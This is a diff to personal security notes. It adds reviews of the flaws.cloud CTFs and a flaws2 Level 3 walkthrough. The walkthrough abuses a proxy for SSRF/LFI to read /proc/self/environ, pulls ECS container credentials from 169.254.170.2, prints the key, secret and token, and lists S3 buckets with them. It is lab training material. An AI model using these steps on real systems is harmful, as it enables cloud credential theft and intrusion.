@@ -318,6 +318,9 @@ WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
 
 # CTFs and hands-on material
 ## flaws.cloud
+
+This one was great. Simple, minimal setup and slowly introduces each concept. But if you're a beginner, you'll learn so much from such small challenges! Definitely worth your time 
+
 ```
 Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud.
 ```
@@ -820,6 +823,8 @@ This was pretty fun, barely any setup needed and great for someone starting out.
 
 ## flaws2.cloud (attacker path)
 
+Same as the first flaws. Unfortunately there are less levels, but on the other hand it looks a bit more realistic with the combination of web and cloud hacking
+
 ### Level 1
 
 Seems to start off as a web challenge, cool! Let's fire up burp
@@ -942,7 +947,50 @@ These creds work in the initial login form, and we find Level 3 at http://level3
 ```
 The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com
 ```
+Once again this screams SSRF! AWS containers running on ECS usually have their credentials at `169.254.170.2/v2/credentials/GUID`, where GUID is a value disclosed in the environment variables. Using the proxy, we can exploit an LFI vulnerability
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://container.target.flaws2.cloud/proxy/file:///proc/self/environ --output out.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   574    0   574    0     0   1649      0 --:--:-- --:--:-- --:--:--  1654
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ cat out.txt                                                                               
+HOSTNAME=ip-172-31-47-179.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12cAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/cb2fb3252d31461abd9fcd33b7980cc5-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/cb2fb3252d31461abd9fcd33b7980cc5-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb2fb3252d31461abd9fcd33b7980cc5-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
+```
+The important part is `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c`, we can curl that with the proxy...
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c
+{"RoleArn":"arn:aws:iam::653711331788:role/level3","AccessKeyId":"ASIAZQNB3KHGPGUE3GXV","SecretAccessKey":"6LcdopLQNXKE2gLAXtiljUG3H9zZ1/C3AKmaspUt","Token":"IQoJb3JpZ2luX2VjELT//////////wEaCXVzLWVhc3QtMSJGMEQCIFqUoPnGlFEsLppoCGJeYTlwJHJ3kXZ9D4sdJGD8Y0EHAiBRK1oZ4P2LeH8TIWYO6tx/ixLJ/XmNhs88BQ6nIK2QiyrjAwhdEAMaDDY1MzcxMTMzMTc4OCIMV62/1us3tMbhL/mtKsADlYozTDyb5dHhKyIah3rXEeN+YBIDA7g9w29tYDwolOF+HDhN2gdvHzFBRMboz8XDcVcW75tjjB61600z77i87/5cWXxKqsdx/obAVcxmJSJBCMc9fQvVGBoM3VmYxDL0duIbSfDVGJKfIvX1BmSYccJizcZTR6Xn3nTrPBV4btT3TimJTK4YWjqthMUG9DgQ3lVZFxzY0aHDtzSyLahgD0kIyj41+vA7yan7OkL240CFl7AkWWCjSfUoybatFTwPbI5Qz15NPijQTTAoc/4HHE8bkuY3XAUiWYl1E/gxrfBd2EL+BqXDRQX9Cud6TnOFzFhCk75T1GcmvzXPo+xEtNaXDodXM0mr+Z8Mk2owLXt1bwxEttX9rQRwd0iVcKhq8S1ZhknlO4eGImGCAmnVxOFV+2BDikG26w7ZFfWuXqztgUH4RIfBEZBZoClUu79B3XLlTz0hEmsQHwxX8FzgO49D9yjoWHpSEHlzpowu4SR5rtQE4XaSxGs4NAd0qtSJH7a8R58USl2tckwQ/j2Pi4jkaeSnbeeNAElxeGXxH34xSFhlS/WRK8elP71XwDZN2I83fq7TPinCDzq6B8dq3jCl7rjHBjqmAbkJOU3X6u1HDEebQ/XT2yAxxxNzWF4QksKU9WFG7ffYsoOwVryeWJ0xjvB5y94IIEDgTG4RWf8Fe+PxLsOh9yB6JhzTP9JYYo4/fsCNuUc9YRZrS4HKOQ3YJ11XOPnRkmc+RtTz6PaEs3ug6rO2Y6ecJxT/DCq40GF/+Ta9aetpBHaAUx27kz8VSOJPAw25o2A1DjDrJ1HW7aU1ue1amurdBsySc8c=","Expiration":"2025-10-14T17:42:29Z"}
+```
+Add them to the credentials file and test them
+```
+┌──(kali㉿kali)-[~]
+└─$ nano ~/.aws/credentials
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ aws sts get-caller-identity --profile flaws2l3
+{
+    "UserId": "AROAJQMBDNUMIKLZKMF64:cb2fb3252d31461abd9fcd33b7980cc5",
+    "Account": "653711331788",
+    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/cb2fb3252d31461abd9fcd33b7980cc5"
+}
+```
 
+Enumerate S3 buckets
+```
+┌──(kali㉿kali)-[~]
+└─$ aws s3 ls --profile flaws2l3
+2018-11-20 14:50:08 flaws2.cloud
+2018-11-20 13:45:26 level1.flaws2.cloud
+2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
+2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
+2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
+```
+
+And we get the final flag/URL at http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/
 
 
 <br>
